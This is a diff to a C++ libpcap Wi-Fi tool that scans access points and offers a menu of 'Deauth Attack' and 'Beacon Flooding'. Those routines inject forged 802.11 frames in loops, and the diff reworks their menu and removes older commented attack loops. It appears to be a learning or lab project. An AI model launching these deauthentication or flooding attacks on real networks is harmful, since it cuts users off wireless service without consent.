@@ -11,6 +11,13 @@
 #include <time.h>
 
 
+map<uint16_t,uint8_t> rd_channel={{2412,1},{2417,2},{2422,3},{2427,4},{2432,5},{2437,6},{2442,7},{2447,8}
+                                   ,{2452,9},{2457,10},{2462,11},{2467,12},{2472,13},{5180,36},{5200,40},
+                                    {5220,44},{5240,48},{5260,52},{5280,56},{5300,60},{5320,64},{5500,100},
+                                   {5520,104},{5540,108},{5560,112},{5580,116},{5600,120},{5620,124},
+                                    {5640,128},{5660,132},{5680,136},{5700,140}};
+
+
 void usage(){
 
     printf("syntax: airodump <interface>\n");
@@ -19,7 +26,9 @@ void usage(){
 
 void scan(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struct ap> &ap_ls);
 void print_ap(set<vector<uint8_t>> ap_list,map<vector<uint8_t>,struct ap> ap_ls);
-void exe_deauth(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap);
+void select(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struct ap> &ap_ls,vector<uint8_t> &sel_mac,struct ap &sel_ap);
+
+void exe_deauth(pcap_t* handle,vector<uint8_t> sel_mac);
 void exe_beacon(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap);
 
 void thread_scan(pcap_t* handle,bool *attack,bool *run,vector<uint8_t> sel);
@@ -54,35 +63,9 @@ int main(int argc, char *argv[])
     struct ap sel_ap;
 
 
-    scan(handle,ap_list, ap_ls);
+    select(handle,ap_list,ap_ls,sel_mac,sel_ap);
 
-
-    /* Print AP list*/
-
-    print_ap(ap_list,ap_ls);
-
-
-    /* Select AP */
-
-
-
-    int sel;
-    printf("select AP Number : ");
-    scanf("%d",&sel);
-
-
-
-
-
-    int number=1;
-    for(auto i=ap_ls.begin();i!=ap_ls.end();i++){
-        if(sel!=number++) continue;
-
-        sel_mac=i->first;
-        sel_ap=i->second;
-
-
-       }
+    while(true){
 
     printf("                               ");
     printf("------------------Select------------------\n");
@@ -96,88 +79,29 @@ int main(int argc, char *argv[])
 
 
 
-    int attack_nr;
+    int menu_nr;
     printf("                               ");
-    printf("------------------Attack------------------\n");
+    printf("-------------------Menu-------------------\n");
     printf("                               ");
-    printf("    [1] Deauth Attack & Checking \n");
+    printf("    [1] Rescan \n");
     printf("                               ");
-    printf("    [2] Beacon Flooding \n");
+    printf("    [2] Deauth Attack & Checking \n");
+    printf("                               ");
+    printf("    [3] Beacon Flooding \n");
+    printf("                               ");
+    printf("    [4] Exit \n");
     printf("                               ");
     printf("------------------------------------------\n");
-    printf("select Attack Number : ");
-    scanf("%d",&attack_nr);
-
-    switch (attack_nr) {
-
-    case 1 : exe_deauth(handle,sel_mac,sel_ap);break;
-    case 2 : exe_beacon(handle,sel_mac,sel_ap);break;
-
-    }
+    printf("select Menu Number : ");
+    scanf("%d",&menu_nr);
 
 
-/*
-        uint8_t beacon1_size;
-        uint8_t *beacon1=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,1);
-        uint8_t *beacon2=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,2);
-        uint8_t *beacon3=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,3);
+    if(menu_nr==1)select(handle,ap_list,ap_ls,sel_mac,sel_ap);
+    else if(menu_nr==2)exe_deauth(handle,sel_mac);
+    else if (menu_nr==3)exe_beacon(handle,sel_mac,sel_ap);
+    else break;
+  }
 
-
-
-        while(1){
-         if (pcap_sendpacket(handle, beacon1, beacon1_size) != 0) printf("\nsend packet Error \n");
-         if (pcap_sendpacket(handle, beacon2, beacon1_size) != 0) printf("\nsend packet Error \n");
-         if (pcap_sendpacket(handle, beacon3, beacon1_size) != 0) printf("\nsend packet Error \n");
-         usleep(5000);
-
-           }*/
-
-/*
-        bool attack_defense=false;
-        bool scan_run=true;
-        uint8_t deauth_size=0;
-        uint8_t *deauth=make_deauth(sel_mac,(uint8_t*)&deauth_size);
-
-
-        time_t start,end;
-        start=time(NULL);
-        thread attack = thread(thread_attack,handle,deauth,deauth_size);
-        thread scan = thread(thread_scan,handle,&attack_defense,&scan_run,sel_mac);
-
-        attack.join();
-        if((!attack.joinable())&&(scan.joinable())) scan_run=false;
-        scan.join();
-        end=time(NULL);
-
-        system("clear");
-        printf("                               ");
-        printf("------------------Select------------------\n");
-        printf("                                            ");
-        for(int j=0;j<5;j++) printf("%02x:",sel_mac[j]);
-        printf("%02x\n",sel_mac[5]);
-        printf("                                            ");
-        printf("ESSID:");
-        for(auto k=sel_ap.essid.begin();k<sel_ap.essid.end();k++) printf("%c",(*k));
-        printf("\n");
-        printf("                               ");
-        printf("------------------Result------------------\n");
-        printf("                                            ");
-        printf("Total time : %f\n",(double)end-start);
-        printf("                                            ");
-        printf("Deauth defense : %d\n",attack_defense);
-        printf("                               ");
-        printf("------------------------------------------\n");
-*/
-
-/*
-         for(int i=0;i<1000000;i++){
-                     if(i%100==0) {
-         if (pcap_sendpacket(handle, deauth, deauth_size) != 0) printf("\nsend packet Error \n");
-         printf("send deauth packet %d\n", i);
-         usleep(5000);
-            }
-        }
-*/
 
 }
 
@@ -223,6 +147,7 @@ void scan(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struc
        struct ap temp_ap;
        temp_ap.beacon=1;
        temp_ap.essid=name;
+       temp_ap.channel=(rd_channel.find(*((uint16_t*)rd+9)))->second;
        temp_ap.pwr=-((~(*((uint8_t*)rd+22))+1)&0x000000FF);
        temp_ap.essid_len=size;
        //printf("%d\n",temp_ap.pwr);
@@ -240,14 +165,16 @@ void print_ap(set<vector<uint8_t>> ap_list,map<vector<uint8_t>,struct ap> ap_ls)
     int num=1;
     for(auto i=ap_ls.begin();i!=ap_ls.end();i++)
            {
-             printf("[%d] ",num++);
+             if(num>9)printf("[%d]",num++);
+             else printf("[%d] ",num++);
 
              for(int j=0;j<5;j++)
                  printf("%02x:",i->first[j]);
              printf("%02x",i->first[5]);
              printf("  %3d",i->second.pwr);
-             printf("  %7d",i->second.beacon);
-             printf("                                           ");
+             printf("    %7d",i->second.beacon);
+             printf("             %3d",i->second.channel);
+             printf("                         ");
              for(auto k=i->second.essid.begin();k<i->second.essid.end();k++)
                   printf("%c",(*k));
              printf("\n");
@@ -308,7 +235,7 @@ void thread_attack(pcap_t* handle,uint8_t *packet,uint8_t packet_size){
        }
 }
 
-void exe_deauth(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){
+void exe_deauth(pcap_t* handle,vector<uint8_t> sel_mac){
 
 
 
@@ -332,15 +259,6 @@ void exe_deauth(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){
 
     system("clear");
     printf("                               ");
-    printf("------------------Select------------------\n");
-    printf("                                            ");
-    for(int j=0;j<5;j++) printf("%02x:",sel_mac[j]);
-    printf("%02x\n",sel_mac[5]);
-    printf("                                            ");
-    printf("ESSID:");
-    for(auto k=sel_ap.essid.begin();k<sel_ap.essid.end();k++) printf("%c",(*k));
-    printf("\n");
-    printf("                               ");
     printf("------------------Result------------------\n");
     printf("                                            ");
     printf("Total time : %f\n",(double)end-start);
@@ -361,7 +279,43 @@ void exe_beacon(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){
      if (pcap_sendpacket(handle, beacon1, beacon1_size) != 0) printf("\nsend packet Error \n");
      if (pcap_sendpacket(handle, beacon2, beacon1_size) != 0) printf("\nsend packet Error \n");
      if (pcap_sendpacket(handle, beacon3, beacon1_size) != 0) printf("\nsend packet Error \n");
-     if(i%100000==0) printf("~Beacon Flooding~\n", i);
+     if(i%100000==0) printf("~Beacon Flooding~\n");
      usleep(5000);
     }
+}
+
+void select(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struct ap> &ap_ls,vector<uint8_t> &sel_mac,struct ap &sel_ap){
+
+    int sel;
+    while(true){
+        ap_list.clear();
+        ap_ls.clear();
+        scan(handle,ap_list, ap_ls);
+
+
+        /* Print AP list*/
+
+        print_ap(ap_list,ap_ls);
+
+
+        /* Select AP */
+
+
+        printf("select AP Number (research:0) : ");
+        scanf("%d",&sel);
+
+        if(sel==0) continue;
+        else break;
+    }
+
+
+    int number=1;
+    for(auto i=ap_ls.begin();i!=ap_ls.end();i++){
+        if(sel!=number++) continue;
+
+        sel_mac=i->first;
+        sel_ap=i->second;
+
+
+       }
 }
